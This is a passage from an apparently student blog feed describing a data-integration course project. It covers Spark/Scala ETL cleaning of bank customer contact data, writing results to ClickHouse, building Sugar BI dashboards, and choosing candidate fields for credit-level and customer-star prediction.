<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">​	结果如下：</span><br><span class="line"></span><br><span class="line">![image<span class="number">-20241215215407311</span>](https:<span class="comment">//jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215407311.png)</span></span><br><span class="line"></span><br><span class="line">##### <span class="number">2.</span> ETL小作业</span><br><span class="line"></span><br><span class="line"><span class="number">10.</span> ```scala</span><br><span class="line">    <span class="keyword">if</span>(tblNameDst == <span class="string">&quot;pri_cust_contact_info&quot;</span>)&#123; </span><br><span class="line">        <span class="comment">// 定义电话号码的正则表达式 </span></span><br><span class="line">        val phoneRegex: Regex = <span class="string">&quot;^1[3-9]\\d&#123;9&#125;$&quot;</span>.r </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 创建一个用户定义函数（UDF）来验证电话号码，并根据其有效性返回原始电话号码或空字符串 </span></span><br><span class="line">        val validatePhoneUDF = udf((phone: String, con_type: String) =&gt; &#123; </span><br><span class="line">            <span class="keyword">if</span> (con_type == <span class="string">&quot;HOMEADD&quot;</span>) &#123; </span><br><span class="line">                phone <span class="comment">// 如果con_type为HOMEADD，直接返回原始值 </span></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">Set</span>(<span class="string">&quot;TEL&quot;</span>, <span class="string">&quot;OTH&quot;</span>, <span class="string">&quot;MOB&quot;</span>).contains(con_type) <span class="comment">&amp;&amp; phone != null &amp;&amp; honeRegex.findFirstIn(phone).isDefined) &#123;</span> </span><br><span class="line">    </span><br><span class="line">                phone </span><br><span class="line">            &#125; else&#123; </span><br><span class="line">                <span class="string">&quot;&quot;</span> </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;) </span><br><span class="line">        <span class="comment">// 使用withColumn方法将validatePhoneUDF应用于数据集的contact列，更新电话号码 </span></span><br><span class="line">        df <span class="comment">= df.withColumn(</span><span class="comment">&quot;contact&quot;</span><span class="comment">, validatePhoneUDF(col(</span><span class="comment">&quot;contact&quot;</span><span class="comment">), col(</span><span class="comment">&quot;con_type&quot;</span><span class="comment">)))</span> </span><br><span class="line">    </span><br><span class="line">        <span class="comment">//去除除了主键以外全为空的列 </span></span><br><span class="line">        <span class="comment">// 定义主键 </span></span><br><span class="line">        val <span class="comment">primaryKey =</span> <span class="comment">&quot;uid&quot;</span> </span><br><span class="line">        <span class="comment">// 获取除主键（uid）以外的所有列名 </span></span><br><span class="line">        val <span class="comment">columns = df.columns.filter(_ != primaryKey)</span> </span><br><span class="line">        <span class="comment">// 创建一个用于检查所有列是否为空的条件表达式 </span></span><br><span class="line">        val <span class="comment">allColumnsNullCondition = columns.map(col =&gt; isnull(df(col))).reduce(_ &amp;&amp; _)</span> </span><br><span class="line">        <span class="comment">// 使用`filter`方法，仅保留至少有一个非主键列不为空的行 </span></span><br><span class="line">        df.filter(not(allColumnsNullCondition)) </span><br><span class="line">    </span><br><span class="line">        val <span class="comment">rdd = df.rdd</span> </span><br><span class="line">        <span class="comment">// 将RDD转换为PairRDD，键为uid </span></span><br><span class="line">        val <span class="comment">pairRDD = rdd.map(row =&gt; &#123;</span> </span><br><span class="line">            val <span class="comment">uid = row.getAs[String](</span><span class="comment">&quot;uid&quot;</span><span class="comment">)</span> </span><br><span class="line">            val <span class="comment">con_type = row.getAs[String](</span><span class="comment">&quot;con_type&quot;</span><span class="comment">)</span> </span><br><span class="line">            val <span class="comment">contact = row.getAs[String](</span><span class="comment">&quot;contact&quot;</span><span class="comment">)</span> </span><br><span class="line">    </span><br><span class="line">            val <span class="comment">contactPhone = if (Set(</span><span class="comment">&quot;TEL&quot;</span><span class="comment">,</span> <span class="comment">&quot;OTH&quot;</span><span class="comment">,</span> <span class="comment">&quot;MOB&quot;</span><span class="comment">).contains(con_type) &amp;&amp; !Set(</span><span class="comment">&quot;无&quot;</span><span class="comment">,</span> <span class="comment">&quot;-&quot;</span><span class="comment">,</span> <span class="comment">&quot;&quot;</span><span class="comment">, null).contains(contact)) contact else</span> <span class="comment">&quot;&quot;</span> </span><br><span class="line">            val <span class="comment">contactAddress = if (!Set(</span><span class="comment">&quot;TEL&quot;</span><span class="comment">,</span> <span class="comment">&quot;OTH&quot;</span><span class="comment">,</span> <span class="comment">&quot;MOB&quot;</span><span class="comment">,</span> <span class="comment">&quot;无&quot;</span><span class="comment">,</span> <span class="comment">&quot;-&quot;</span><span class="comment">,</span> <span class="comment">&quot;&quot;</span><span class="comment">, null).contains(con_type) &amp;&amp; !Set(</span><span class="comment">&quot;无&quot;</span><span class="comment">,</span> <span class="comment">&quot;-&quot;</span><span class="comment">,</span> <span class="comment">&quot;&quot;</span><span class="comment">, null).contains(contact)) contact else</span> <span class="comment">&quot;&quot;</span> </span><br><span class="line">    </span><br><span class="line">            (uid, (row, contactPhone, contactAddress)) </span><br><span class="line">        &#125;) </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 定义一个函数用于合并联系方式 </span></span><br><span class="line">        <span class="comment">// 修改的mergeContacts函数 </span></span><br><span class="line">        def <span class="comment">mergeContacts(contact1: (Row, String, String), contact2: (Row, String, String)): (Row, String, String) = &#123;</span> </span><br><span class="line">            val <span class="comment">phoneSeparator =</span> <span class="comment">&quot;,&quot;</span> </span><br><span class="line">            val <span class="comment">addressSeparator =</span> <span class="comment">&quot;,&quot;</span> </span><br><span class="line">            val <span class="comment">invalidContacts = Set(</span><span class="comment">&quot;无&quot;</span><span class="comment">,</span> <span class="comment">&quot;-&quot;</span><span class="comment">,</span> <span class="comment">&quot;&quot;</span><span class="comment">, null)</span> </span><br><span class="line">    </span><br><span class="line">            val <span class="comment">(phone1, address1) = (contact1._2, contact1._3)</span> </span><br><span class="line">            val <span class="comment">(phone2, address2) = (contact2._2, contact2._3)</span> </span><br><span class="line">    </span><br><span class="line">            val <span class="comment">newPhone = (phone1.split(phoneSeparator) ++ phone2.split(phoneSeparator)).filterNot(invalidContacts.contains).distinct.mkString(phoneSeparator)</span> </span><br><span class="line">            val <span class="comment">newAddress = (address1.split(addressSeparator) ++ address2.split(addressSeparator)).filterNot(invalidContacts.contains).distinct.mkString(addressSeparator)</span> </span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 获取 update_date 和 create_date 的列索引 </span></span><br><span class="line">            val <span class="comment">updateDateIndex = 5</span> </span><br><span class="line">            val <span class="comment">createDateIndex = 4</span> </span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 使用 Option 类型处理空值 </span></span><br><span class="line">            val <span class="comment">updateDate1 = Option(contact1._1.get(updateDateIndex)).map(_.toString).getOrElse(</span><span class="comment">&quot;&quot;</span><span class="comment">)</span> </span><br><span class="line">            val <span class="comment">updateDate2 = Option(contact2._1.get(updateDateIndex)).map(_.toString).getOrElse(</span><span class="comment">&quot;&quot;</span><span class="comment">)</span> </span><br><span class="line">            val <span class="comment">createDate1 = Option(contact1._1.get(createDateIndex)).map(_.toString).getOrElse(</span><span class="comment">&quot;&quot;</span><span class="comment">)</span> </span><br><span class="line">            val <span class="comment">createDate2 = Option(contact2._1.get(createDateIndex)).map(_.toString).getOrElse(</span><span class="comment">&quot;&quot;</span><span class="comment">)</span> </span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 使用 create_date 作为 update_date 的备选值 </span></span><br><span class="line">            val <span class="comment">effectiveUpdateDate1 = if (updateDate1.nonEmpty) updateDate1 else createDate1</span> </span><br><span class="line">            val <span class="comment">effectiveUpdateDate2 = if (updateDate2.nonEmpty) updateDate2 else createDate2</span> </span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 根据 update_date 和 create_date 选择较新的一行 </span></span><br><span class="line">            val <span class="comment">newerRow = if (effectiveUpdateDate1 &gt; effectiveUpdateDate2) contact1._1 else contact2._1</span> </span><br><span class="line">    </span><br><span class="line">            <span class="comment">// 直接合并两行中的所有列 </span></span><br><span class="line">            val <span class="comment">newRowData = newerRow.toSeq</span> </span><br><span class="line">            val <span class="comment">newRow = Row.fromSeq(newRowData)</span> </span><br><span class="line">    </span><br><span class="line">            (newRow, newPhone, newAddress) </span><br><span class="line">        &#125; </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 使用reduceByKey合并相同uid的数据 </span></span><br><span class="line">        val <span class="comment">reducedPairRDD = pairRDD.reduceByKey(mergeContacts)</span> </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 定义结果的schema </span></span><br><span class="line">        val <span class="comment">schema = df.schema</span> </span><br><span class="line">        .add(StructField(<span class="string">&quot;contact_phone&quot;</span>, StringType, nullable <span class="comment">= true))</span> </span><br><span class="line">        .add(StructField(<span class="string">&quot;contact_address&quot;</span>, StringType, nullable <span class="comment">= true))</span> </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 将结果转换回DataFrame </span></span><br><span class="line">        val <span class="comment">rowRDD = reducedPairRDD.map &#123; case (uid, (row, contactPhone, contactAddress)) =&gt;</span> </span><br><span class="line">            val <span class="comment">newRowData = row.toSeq :+ contactPhone :+ contactAddress</span> </span><br><span class="line">            Row.fromSeq(newRowData) </span><br><span class="line">        &#125; </span><br><span class="line">        val <span class="comment">reducedDF = session.createDataFrame(rowRDD, schema)</span> </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 删除原始的contact列 </span></span><br><span class="line">        val <span class="comment">newDF = reducedDF.drop(</span><span class="comment">&quot;contact&quot;</span><span class="comment">)</span> </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 显示和打印合并后的DataFrame </span></span><br><span class="line">        newDF.show(20) </span><br><span class="line">        println(newDF.count()) </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 定义一个正则表达式，用于匹配18位数字的uid </span></span><br><span class="line">        val <span class="comment">uidRegex: Regex =</span> <span class="comment">&quot;^\\d&#123;18&#125;$&quot;</span><span class="comment">.r</span> </span><br><span class="line">    </span><br><span class="line">        <span class="comment">// 过滤掉不是18位数字的行 </span></span><br><span class="line">        val <span class="comment">finalDF = newDF.filter(row=&gt; uidRegex.findFirstIn(row.getAs[String(</span><span class="comment">&quot;uid&quot;</span><span class="comment">)).isDefined)</span> 		  	<span class="comment">println(finalDF.count())</span> </span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ol>
<p>小作业结果如下：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215420517.png" alt="image-20241215215420517" style="zoom:67%;" />

<h5 id="3-写入ClickHouse"><a href="#3-写入ClickHouse" class="headerlink" title="3.  写入ClickHouse"></a>3.  写入ClickHouse</h5><p>​	写入clickhouse代码如下：</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">val</span> clickHouseProperties = <span class="keyword">new</span> <span class="type">Properties</span>() </span><br><span class="line">clickHouseProperties.put(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;default&quot;</span>) </span><br><span class="line">clickHouseProperties.put(<span class="string">&quot;password&quot;</span>, <span class="string">&quot;292513Jqq&quot;</span>) </span><br><span class="line">clickHouseProperties.put(<span class="string">&quot;driver&quot;</span>, <span class="string">&quot;ru.yandex.clickhouse.ClickHouseDriver&quot;</span>) </span><br><span class="line">resData.write.mode(<span class="type">SaveMode</span>.<span class="type">Append</span>) </span><br><span class="line">.jdbc(<span class="string">&quot;jdbc:clickhouse://172.31.56.66:8123/dm&quot;</span>, <span class="string">&quot;dm.&quot;</span>+tblNameDst, clickHouseProperties) </span><br></pre></td></tr></table></figure>

<h5 id="4-处理结果展示"><a href="#4-处理结果展示" class="headerlink" title="4. 处理结果展示"></a>4. 处理结果展示</h5><p>一共写入9张九张静态表，即下图中包含数据的9张表</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215430723.png" alt="image-20241215215430723" style="zoom:67%;" />



<h3 id="可视化部分"><a href="#可视化部分" class="headerlink" title="可视化部分"></a>可视化部分</h3><h4 id="一-可视化工具使用"><a href="#一-可视化工具使用" class="headerlink" title="一 可视化工具使用"></a>一 可视化工具使用</h4><p>​	使用百度的Sugar BI作为可视化工具，具体步骤为：</p>
<ol>
<li><p>申请账号后，在Sugar BI中创建一个空间</p>
</li>
<li><p>导入数据源，具体如下：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215448272.png" alt="image-20241215215448272" style="zoom:67%;" />

<p>为了使Sugar BI能访问到本地8123端口的clickhouse，需要使用内网隧道，从Sugar BI下载内网隧道客户端后，解压至本地，然后修改db.txt文件内容为127.0.0.1:8123，然后使用<code>bash start.sh</code>命令启动内网隧道，回到Sugar BI测试连接。</p>
</li>
<li><p>Sugar BI成功连接本地clickhouse后，可以在数据表预览中查看所有表，应该能看到里面的数据，但仅显示部分：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215508033.png" alt="image-20241215215508033" style="zoom:67%;" /></li>
</ol>
<h4 id="二-创建可视化模型"><a href="#二-创建可视化模型" class="headerlink" title="二 创建可视化模型"></a>二 创建可视化模型</h4><ol>
<li><p>在Sugar BI中新建一个大屏，选择一个合适的界面，进入编辑，然后选择想要的组件（如柱状图、折线图、饼图等），为组件添加sql模型，这样组件就会展示clickhouse中的数据。</p>
</li>
<li><p>例如展示活期交易日top20用户，先创建一个sql模型，如下：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215525611.png" alt="image-20241215215525611" style="zoom:67%;" />
</li>
<li><p>然后创建一张横向柱状图，绑定刚刚的sql模型，设置绑定字段、x轴与y轴、刷新时间等等，如下：</p>
<img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215538461.png" alt="image-20241215215538461" style="zoom:80%;" /></li>
</ol>
<h4 id="三-可视化结果展示"><a href="#三-可视化结果展示" class="headerlink" title="三 可视化结果展示"></a>三 可视化结果展示</h4><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20241215215549062.png" alt="image-20241215215549062" style="zoom:80%;" />

<p>左上的图展示每日客户交易量TOP20，显示了当天实时活期交易额最高的20个客户及其交易量；</p>
<p>下面的图展示了从数据记录之初到实时的每日交易总额变化，从中可以清晰看出交易量的变化趋势、峰值谷值的分布；</p>
<p>右上的饼图使用了静态数据，显示了各种存款类型在银行存款中所占比例以及各种定期存款的大致比例。</p>
<p>可视化视频已作为附件一并打包上传，展示数据的实时变化。</p>
<h3 id="团队分工"><a href="#团队分工" class="headerlink" title="团队分工"></a>团队分工</h3><table>
<thead>
<tr>
<th>姓名</th>
<th>学号</th>
<th>分工</th>
</tr>
</thead>
<tbody><tr>
<td>xxx</td>
<td>xxxxxxxxx</td>
<td>可视化部分</td>
</tr>
<tr>
<td>xxx</td>
<td>xxxxxxxxx</td>
<td>实时数据kafka和flink部分</td>
</tr>
<tr>
<td>xxx</td>
<td>xxxxxxxxx</td>
<td>静态数据ETL处理</td>
</tr>
<tr>
<td>xxx</td>
<td>xxxxxxxxx</td>
<td>静态数据部分环境搭建</td>
</tr>
<tr>
<td>xxx</td>
<td>xxxxxxxxx</td>
<td>clickhouse搭建</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>数据集成</category>
      </categories>
      <tags>
        <tag>数据集成</tag>
        <tag>kafka</tag>
        <tag>flink</tag>
        <tag>clickhouse</tag>
        <tag>hadoop</tag>
        <tag>scala</tag>
        <tag>spark</tag>
      </tags>
  </entry>
  <entry>
    <title>数据集成-作业三</title>
    <url>/2024/12/15/%E6%95%B0%E6%8D%AE%E9%9B%86%E6%88%90-%E4%BD%9C%E4%B8%9A%E4%B8%89/</url>
    <content><![CDATA[<p>完整项目地址：<a href="https://git.nju.edu.cn/bin/data-intergration/-/tree/main/homework3?ref_type=heads">homework3 · main · 垃圾桶 &#x2F; Data-Intergration · GitLab</a></p>
<h3 id="一-数据收集与盘点"><a href="#一-数据收集与盘点" class="headerlink" title="一 数据收集与盘点"></a>一 数据收集与盘点</h3><h4 id="1-初选合适字段"><a href="#1-初选合适字段" class="headerlink" title="1. 初选合适字段"></a>1. 初选合适字段</h4><p>​	一共有23张原始数据表，从中初选出的合适字段有以下：</p>
<span id="more"></span>

<table>
<thead>
<tr>
<th>uid</th>
<th>证件号码</th>
<th>理由</th>
</tr>
</thead>
<tbody><tr>
<td>credit_level</td>
<td>信用等级</td>
<td></td>
</tr>
<tr>
<td>star_level</td>
<td>客户星级</td>
<td></td>
</tr>
<tr>
<td><strong>贷记卡开户明细</strong></td>
<td><strong>dm_v_as_djk_info</strong></td>
<td>贷记卡中一般反应了与信用等级有关的信息</td>
</tr>
<tr>
<td>is_withdrw</td>
<td>是否开通取现功能</td>
<td>信用等级越高越有可能开通</td>
</tr>
<tr>
<td>is_transfer</td>
<td>是否开通转账功能</td>
<td>信用等级越高越有可能开通</td>
</tr>
<tr>
<td>is_deposit</td>
<td>是否开通存款功能</td>
<td>信用等级越高越有可能开通</td>
</tr>
<tr>
<td>is_purchse</td>
<td>是否开通消费功能</td>
<td>信用等级越高越有可能开通</td>
</tr>
<tr>
<td>cred_limit</td>
<td>信用额度</td>
<td>直接与信用挂钩</td>
</tr>
<tr>
<td>dlay_amt</td>
<td>逾期金额</td>
<td>直接与信用挂钩</td>
</tr>
<tr>
<td>five_class</td>
<td>五级分类</td>
<td>与信用相关</td>
</tr>
<tr>
<td>is_mob_bank</td>
<td>是否绑定手机银行</td>
<td>信用等级越高越有可能绑定</td>
</tr>
<tr>
<td>is_etc</td>
<td>是否绑定ETC</td>
<td>信用等级越高越有可能绑定</td>
</tr>
<tr>
<td>bal</td>
<td>余额</td>
<td>一般与信用等级正相关</td>
</tr>
<tr>
<td>dlay_mths</td>
<td>逾期期数</td>
<td>直接与信用挂钩</td>
</tr>
<tr>
<td><strong>贷记卡分期付款明细</strong></td>
<td><strong>dm_v_as_djkfq_info</strong></td>
<td>贷记卡中一般反应了与信用等级有关的信息</td>
</tr>
<tr>
<td>mp_type</td>
<td>分期类型</td>
<td>与信用等级相关</td>
</tr>
<tr>
<td>mp_status</td>
<td>分期付款状态</td>
<td>直接影响信用</td>
</tr>
<tr>
<td>total_amt</td>
<td>总产品金额</td>
<td>可能与信用等级相关</td>
</tr>
<tr>
<td>rem_ppl</td>
<td>剩余未还本金</td>
<td>未还越少一般信用等级越高</td>
</tr>
<tr>
<td>total_fee</td>
<td>总费用</td>
<td>可能与信用等级相关</td>
</tr>
<tr>
<td>rem_fee</td>
<td>剩余未还费用</td>
<td>未还越少一般信用等级越高</td>
</tr>
<tr>
<td>rec_fee</td>
<td>已收手续费</td>
<td>间接反映还款能力，与信用等级相关</td>
</tr>
<tr>
<td><strong>存款账号信息</strong></td>
<td><strong>pri_cust_asset_acct_info</strong></td>
<td>存款账户反应客户的财务能力，与星级有关</td>
</tr>
<tr>
<td>term</td>
<td>存款期限</td>
<td>期限越长一般客户星级越高</td>
</tr>
<tr>
<td>acct_char</td>
<td>账户性质</td>
<td>账户性质能反应客户星级</td>
</tr>
<tr>
<td>deps_type</td>
<td>存款种类</td>
<td>存款种类可能与客户星级有关</td>
</tr>
<tr>
<td>is_secu_card</td>
<td>是否社保卡</td>
<td>是社保卡往往更重要，与客户星级有关</td>
</tr>
<tr>
<td>acct_sts</td>
<td>账户状态</td>
<td>账户状态反应客户星级</td>
</tr>
<tr>
<td>frz_sts</td>
<td>冻结状态</td>
<td>客户星级高的一般不冻结</td>
</tr>
<tr>
<td>stp_sts</td>
<td>止付状态</td>
<td>客户星级高的一般不止付</td>
</tr>
<tr>
<td>acct_bal</td>
<td>原币余额</td>
<td>余额高的一般客户星级高</td>
</tr>
<tr>
<td>bal</td>
<td>余额</td>
<td>余额高的一般客户星级高</td>
</tr>
<tr>
<td>avg_mth</td>
<td>月日均</td>
<td>月均高的一般客户星级高</td>
</tr>
<tr>
<td>avg_qur</td>
<td>季度日均</td>
<td>季均高的一般客户星级高</td>
</tr>
<tr>
<td>avg_year</td>
<td>年日均</td>
<td>年均高的一般客户星级高</td>
</tr>
<tr>
<td><strong>存款汇总信息</strong></td>
<td><strong>pri_cust_asset_info</strong></td>
<td>存款汇总信息反应客户财务能力，与星级有关</td>
</tr>
<tr>
<td>all_bal</td>
<td>总余额</td>
<td>余额高的一般客户星级高</td>
</tr>
<tr>
<td>avg_mth</td>
<td>月日均</td>
<td>月均高的一般客户星级高</td>
</tr>
<tr>
<td>avg_qur</td>
<td>季度日均</td>
<td>季均高的一般客户星级高</td>
</tr>
<tr>
<td>avg_year</td>
<td>年日均</td>
<td>年均高的一般客户星级高</td>
</tr>
<tr>
<td>sa_bal</td>
<td>活期余额</td>
<td>余额高的一般客户星级高</td>
</tr>
<tr>
<td>td_bal</td>
<td>定期余额</td>
<td>余额高的一般客户星级高</td>
</tr>
<tr>
<td>fin_bal</td>
<td>理财余额</td>
<td>余额高的一般客户星级高</td>
</tr>
<tr>
<td>sa_crd_bal</td>
<td>卡活期余额</td>
<td>余额高的一般客户星级高</td>
</tr>
<tr>
<td>td_crd_bal</td>
<td>卡内定期</td>
<td>定期存款高的一般客户星级高</td>
</tr>
<tr>
<td>sa_td_bal</td>
<td>定活两便</td>
<td>两便存款余额高的一般客户星级高</td>
</tr>
<tr>
<td>ntc_bal</td>
<td>通知存款</td>
<td>存款余额高的一般客户星级高</td>
</tr>
<tr>
<td>td_3m_bal</td>
<td>定期3个月</td>
<td>定期存款高的一般客户星级高</td>
</tr>
<tr>
<td>td_6m_bal</td>
<td>定期6个月</td>
<td>定期存款高的一般客户星级高</td>
</tr>
<tr>
<td>td_1y_bal</td>
<td>定期1年</td>
<td>定期存款高的一般客户星级高</td>
</tr>
<tr>
<td>td_2y_bal</td>
<td>定期2年</td>
<td>定期存款高的一般客户星级高</td>
</tr>
<tr>
<td>td_3y_bal</td>
<td>定期3年</td>
<td>定期存款高的一般客户星级高</td>
</tr>
<tr>
<td>td_5y_bal</td>
<td>定期5年</td>
<td>定期存款高的一般客户星级高</td>
</tr>
<tr>
<td>oth_td_bal</td>
<td>定期其他余额</td>
<td>定期存款高的一般客户星级高</td>
</tr>
<tr>
<td>cd_bal</td>
<td>大额存单余额</td>
<td>定期存款高的一般客户星级高</td>
</tr>
<tr>
<td><strong>个人基本信息</strong></td>
<td><strong>pri_cust_base_info</strong></td>
<td>个人基本信息能反映个人经济水平，与星级相关</td>
</tr>
<tr>
<td>sex</td>
<td>性别</td>
<td>无明显关联</td>
</tr>
<tr>
<td>marrige</td>
<td>婚姻状况</td>
<td>无明显关联</td>
</tr>
<tr>
<td>education</td>
<td>教育程度</td>
<td>教育程度高的一般经济能力强，与星级相关</td>
</tr>
<tr>
<td>career</td>
<td>职业</td>
<td>职业反映经济能力，与星级相关</td>
</tr>
<tr>
<td>prof_titl</td>
<td>职称</td>
<td>职称反映经济能力，与星级相关</td>
</tr>
<tr>
<td>country</td>
<td>国籍</td>
<td>无明显关联</td>
</tr>
<tr>
<td>is_employee</td>
<td>员工标志</td>
<td>无明显关联</td>
</tr>
<tr>
<td>is_shareholder</td>
<td>是否股东</td>
<td>股东经济能力强，与星级相关</td>
</tr>
<tr>
<td>is_black</td>
<td>是否黑名单</td>
<td>进入黑名单一般星级低</td>
</tr>
<tr>
<td>is_contact</td>
<td>是否关联人</td>
<td>无明显关联</td>
</tr>
<tr>
<td>is_mgr_dep</td>
<td>是否营销部客户</td>
<td>营销部客户一般星级高</td>
</tr>
<tr>
<td><strong>贷款账号信息</strong></td>
<td><strong>pri_cust_liab_acct_info</strong></td>
<td>贷款账号信息直接反应信用等级</td>
</tr>
<tr>
<td>loan_amt</td>
<td>贷款金额</td>
<td>可能与信用等级有关</td>
</tr>
<tr>
<td>loan_bal</td>
<td>贷款余额</td>
<td>余额越少，一般信用等级越低</td>
</tr>
<tr>
<td>vouch_type</td>
<td>主要担保方式</td>
<td>担保方式反应信用</td>
</tr>
<tr>
<td>is_mortgage</td>
<td>是否按揭</td>
<td>按揭一般信用比不按揭的信用好</td>
</tr>
<tr>
<td>is_online</td>
<td>是否线上贷款</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td>is_extend</td>
<td>是否展期</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td>five_class</td>
<td>五级分类</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td>overdue_class</td>
<td>逾期细分</td>
<td>直接影响信用</td>
</tr>
<tr>
<td>overdue_flag</td>
<td>逾期标志</td>
<td>直接影响信用</td>
</tr>
<tr>
<td>owed_int_flag</td>
<td>欠息标志</td>
<td>直接影响信用</td>
</tr>
<tr>
<td>credit_amt</td>
<td>合同金额</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td>owed_int_in</td>
<td>表内欠息金额</td>
<td>欠息越少信用越高</td>
</tr>
<tr>
<td>owed_int_out</td>
<td>表外欠息金额</td>
<td>欠息越少信用越高</td>
</tr>
<tr>
<td>delay_bal</td>
<td>逾期金额</td>
<td>预期越少信用越高</td>
</tr>
<tr>
<td>is_book_acct</td>
<td>是否授信台账客户</td>
<td>授信一般信用高</td>
</tr>
<tr>
<td><strong>贷款账户汇总</strong></td>
<td><strong>pri_cust_liab_info</strong></td>
<td>贷款账户一般能反映信用等级</td>
</tr>
<tr>
<td>all_bal</td>
<td>总余额</td>
<td>余额越多一般信用越高</td>
</tr>
<tr>
<td>bad_bal</td>
<td>不良余额</td>
<td>不良越少信用越高</td>
</tr>
<tr>
<td>due_intr</td>
<td>欠息总额</td>
<td>欠息越少信用越高</td>
</tr>
<tr>
<td>norm_bal</td>
<td>正常余额</td>
<td>正常总额越高一般信用越高</td>
</tr>
<tr>
<td>delay_bal</td>
<td>逾期总额</td>
<td>逾期越少信用越高</td>
</tr>
<tr>
<td><strong>合同明细</strong></td>
<td><strong>dm_v_tr_contract_mx</strong></td>
<td>合同明细反应信用等级</td>
</tr>
<tr>
<td>buss_amt</td>
<td>金额</td>
<td>无明显关联</td>
</tr>
<tr>
<td>bal</td>
<td>余额</td>
<td>无明显关联</td>
</tr>
<tr>
<td>norm_bal</td>
<td>正常余额</td>
<td>余额越多一般信用越高</td>
</tr>
<tr>
<td>dlay_bal</td>
<td>逾期余额</td>
<td>逾期越少信用越高</td>
</tr>
<tr>
<td>dull_bal</td>
<td>呆滞余额</td>
<td>呆滞越少信用越高</td>
</tr>
<tr>
<td>owed_int_in</td>
<td>表内欠息金额</td>
<td>欠息越少信用越高</td>
</tr>
<tr>
<td>owed_int_out</td>
<td>表外欠息余额</td>
<td>欠息越少信用越高</td>
</tr>
<tr>
<td>fine_pr_int</td>
<td>本金罚息</td>
<td>罚息越少信用越高</td>
</tr>
<tr>
<td>fine_intr_int</td>
<td>利息罚息</td>
<td>罚息越少信用越高</td>
</tr>
<tr>
<td>dlay_days int4 NULL,</td>
<td>逾期天数</td>
<td>逾期天数越少信用越高</td>
</tr>
<tr>
<td>five_class</td>
<td>五级分类</td>
<td>与信用相关</td>
</tr>
<tr>
<td>is_bad</td>
<td>不良记录标志</td>
<td>不良记录直接影响信用</td>
</tr>
<tr>
<td>frz_amt</td>
<td>冻结金额</td>
<td>冻结余额直接影响信用</td>
</tr>
<tr>
<td>due_intr_days</td>
<td>欠息天数</td>
<td>欠息天数越少信用越高</td>
</tr>
<tr>
<td>shift_bal</td>
<td>移交余额</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td><strong>贷记卡交易</strong></td>
<td><strong>dm_v_tr_djk_mx</strong></td>
<td>可能与信用相关</td>
</tr>
<tr>
<td>tran_amt</td>
<td>交易金额</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td><strong>第三方交易</strong></td>
<td><strong>dm_v_tr_dsf_mx</strong></td>
<td>可能与信用相关</td>
</tr>
<tr>
<td>tran_amt</td>
<td>交易金额</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td><strong>借据明细</strong></td>
<td><strong>dm_v_tr_duebill_mx</strong></td>
<td>借据明细直接反应信用</td>
</tr>
<tr>
<td>buss_amt</td>
<td>金额</td>
<td>金额约低一般信用越高</td>
</tr>
<tr>
<td>bal</td>
<td>余额</td>
<td>余额越高一般信用越高</td>
</tr>
<tr>
<td>norm_bal</td>
<td>正常余额</td>
<td>余额越高一般信用越高</td>
</tr>
<tr>
<td>dlay_amt</td>
<td>逾期金额</td>
<td>逾期余额越高一般信用越低</td>
</tr>
<tr>
<td>dull_amt</td>
<td>呆滞金额</td>
<td>呆滞余额越高一般信用越低</td>
</tr>
<tr>
<td>bad_debt_amt</td>
<td>呆帐金额</td>
<td>呆账余额越高一般信用越低</td>
</tr>
<tr>
<td>owed_int_in</td>
<td>表内欠息金额</td>
<td>欠息余额越高一般信用越低</td>
</tr>
<tr>
<td>owed_int_out</td>
<td>表外欠息金额</td>
<td>欠息余额越高一般信用越低</td>
</tr>
<tr>
<td>fine_pr_int</td>
<td>本金罚息</td>
<td>罚息额越高一般信用越低</td>
</tr>
<tr>
<td>fine_intr_int</td>
<td>利息罚息</td>
<td>罚息额越高一般信用越低</td>
</tr>
<tr>
<td>dlay_days</td>
<td>逾期天数</td>
<td>天数越高一般信用越低</td>
</tr>
<tr>
<td>due_intr_days</td>
<td>欠息天数</td>
<td>天数越高一般信用越低</td>
</tr>
<tr>
<td>pay_freq</td>
<td>还款频率</td>
<td>可能与信用相关</td>
</tr>
<tr>
<td><strong>ETC交易</strong></td>
<td><strong>dm_v_tr_etc_mx</strong></td>
<td>反映客户星级</td>
</tr>
<tr>
<td>tran_amt_fen</td>
<td>交易金额</td>
<td>金额越高星级越高</td>
</tr>
<tr>
<td>real_amt</td>
<td>实收金额</td>
<td>金额越高星级越高</td>
</tr>
<tr>
<td>conces_amt</td>
<td>优惠金额</td>
<td>金额越高星级越高</td>
</tr>
<tr>
